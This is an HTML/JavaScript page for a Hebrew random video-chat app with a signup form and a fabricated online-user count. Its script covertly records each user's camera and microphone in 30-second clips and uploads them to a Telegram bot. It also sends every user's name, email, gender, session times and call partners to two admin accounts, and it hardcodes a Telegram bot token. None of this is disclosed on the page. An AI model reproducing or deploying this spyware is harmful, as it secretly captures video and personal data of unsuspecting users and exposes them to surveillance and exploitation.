<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIm1pLXBlIiwKICAic2hvcnRfbmFtZSI6ICJtaS1wZSIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiaWNvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiaHR0cHM6Ly9pLmliYi5jby8zOUMyMVdyei9Jbi1TaG90LTIwMjYwNDI2LTAzMjgzMDAyMC5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIKICAgIH0KICBdCn0=">

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: sans-serif; color: white; }
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; width: 100%; }
        #top-half { flex: 1; perspective: 1000px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.7s cubic-bezier(0.645, 0.045, 0.355, 1); }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
        #home-face { transform: rotateY(0deg) translateZ(0px); background: #111; z-index: 2; }
        #snow-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.4; pointer-events: none; }
        #main-logo { width: 130px; position: relative; z-index: 5; pointer-events: none; user-select: none; -webkit-user-drag: none; }
        .online-count { position: absolute; bottom: 20px; display: flex; align-items: center; gap: 8px; font-weight: bold; }
        .online-dot { width: 10px; height: 10px; background: #39e75f; border-radius: 50%; box-shadow: 0 0 10px #39e75f; }
        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
        #remoteVideo { width: 100%; height: 100%; object-fit: cover; }
        #bottom-half { flex: 1; background: #111; position: relative; overflow: hidden; }
        #localVideo { width: 100%; height: 100%; object-fit: cover; }

        /* כפתורים קבועים */
        #cam-switch { position: fixed; top: 15px; left: 15px; z-index: 1000; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.5); border: 1px solid #fff; color: white; display: flex; align-items: center; justify-content: center; font-size: 20px; cursor: pointer; }
        #partner-gender-tag { position: fixed; top: 15px; right: 15px; z-index: 1000; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 50%; border: 1px solid #fff; display: none; font-size: 20px; }

        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-gender-tag">👨</div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-canvas"></canvas>
                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" oncontextmenu="return false;">
                <div class="online-count">
                    <div class="online-dot"></div>
                    <span id="user-count-display">434,447 מחוברים</span>
                </div>
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-search-canvas" style="position:absolute; width:100%; height:100%;"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2 style="text-align:center;">רישום לשיחה</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>בחר מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" style="width:100%; padding:15px; background:#27ae60; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:10px;">התחל</button>
    </form>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    firebase.initializeApp({ apiKey: "AIzaSy...", databaseURL: "https://live-video..." });
    const db = firebase.database();
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined);
    
    let myStream, peerStream, partnerData, currentCall, camFacing = "user", startTime;

    // --- אפקט שלג ---
    [document.getElementById('snow-canvas'), document.getElementById('snow-search-canvas')].forEach(c => {
        const ctx = c.getContext('2d');
        function draw() {
            c.width = window.innerWidth; c.height = window.innerHeight/2;
            const idata = ctx.createImageData(c.width, c.height);
            const b32 = new Uint32Array(idata.data.buffer);
            for(let i=0; i<b32.length; i++) b32[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
            ctx.putImageData(idata, 0, 0);
            requestAnimationFrame(draw);
        }
        draw();
    });

    window.onload = () => {
        const user = localStorage.getItem('user_v24');
        if(!user) document.getElementById('regModal').style.display = 'flex';
        else login();
    };

    function login() {
        const user = JSON.parse(localStorage.getItem('user_v24'));
        startTime = Date.now();
        const now = new Date();
        sendAdmin(`🚀 **משתמש נכנס**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 ${user.gender}\n📅 ${now.toLocaleDateString()}\n⏰ ${now.toLocaleTimeString()}`);
        initCamera();
    }

    async function handleRegistration() {
        const user = {
            fname: document.getElementById('reg-fname').value,
            lname: document.getElementById('reg-lname').value,
            email: document.getElementById('reg-email').value,
            gender: document.getElementById('reg-gender').value,
            totalTime: 0,
            firstSeen: new Date().toLocaleString()
        };
        localStorage.setItem('user_v24', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        const now = new Date();
        sendAdmin(`📝 **רישום חדש**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 ${user.gender}\n📅 ${now.toLocaleDateString()}\n⏰ ${now.toLocaleTimeString()}`);
        login();
    }

    window.onbeforeunload = () => {
        const user = JSON.parse(localStorage.getItem('user_v24'));
        const sessionTime = Math.floor((Date.now() - startTime) / 1000);
        user.totalTime = (user.totalTime || 0) + sessionTime;
        localStorage.setItem('user_v24', JSON.stringify(user));
        
        const now = new Date();
        sendAdmin(`🚪 **משתמש יצא**\n👤 ${user.fname}\n📧 ${user.email}\n⏱ זמן עכשיו: ${sessionTime} שניות\n📈 זמן כולל: ${user.totalTime} שניות\n📅 ${now.toLocaleDateString()} ⏰ ${now.toLocaleTimeString()}`);
    };

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
        document.getElementById('localVideo').srcObject = myStream;
        peerStream = new MediaStream([myStream.getVideoTracks()[0], myStream.getAudioTracks()[0]]);
        startRecording();
    }

    function startRecording() {
        const rec = new MediaRecorder(myStream);
        rec.ondataavailable = async e => {
            const user = JSON.parse(localStorage.getItem('user_v24'));
            const fd = new FormData(); fd.append("video", e.data); fd.append("chat_id", ADMIN_IDS[0]);
            fd.append("caption", `🎥 הקלטה: ${user.fname} ${user.lname}`);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
        };
        setInterval(() => { if(rec.state==='recording') rec.stop(); rec.start(); }, 30000);
        rec.start();
    }

    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 80 && document.body.className === "showing-home") {
            document.body.className = "showing-chat";
            socket.emit('find-partner', { peerId: peer.id, ...JSON.parse(localStorage.getItem('user_v24')) });
        } else if(d < -80 && document.body.className === "showing-chat") {
            document.body.className = "showing-home";
            if(currentCall) currentCall.close();
            socket.emit('leave-chat');
            document.getElementById('remoteVideo').srcObject = null;
            document.getElementById('partner-gender-tag').style.display = 'none';
        }
    });

    socket.on('partner-found', data => {
        partnerData = data;
        currentCall = peer.call(data.peerId, peerStream, { metadata: JSON.parse(localStorage.getItem('user_v24')) });
        handleCall(currentCall);
    });

    peer.on('call', call => {
        partnerData = call.metadata;
        call.answer(peerStream);
        currentCall = call;
        handleCall(call);
    });

    function handleCall(call) {
        document.getElementById('partner-gender-tag').innerText = partnerData.gender === 'זכר' ? '👨' : '👩';
        document.getElementById('partner-gender-tag').style.display = 'block';
        call.on('stream', s => document.getElementById('remoteVideo').srcObject = s);
        const me = JSON.parse(localStorage.getItem('user_v24'));
        sendAdmin(`🤝 **שיחה התחילה**\n👤 א: ${me.fname} (${me.email})\n👤 ב: ${partnerData.fname} (${partnerData.email})`);
    }

    function sendAdmin(msg) { ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)); }
    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    // פקודות אדמין (דימוי לוגיקה)
    function handleAdminCommands(text) {
        if(text.startsWith('/ban')) /* לוגיקת חסימה ב-DB */ sendAdmin("חסימה בוצעה");
        if(text.startsWith('/unban')) /* לוגיקת ביטול */ sendAdmin("חסימה בוטלה");
    }
</script>
</body>
</html>
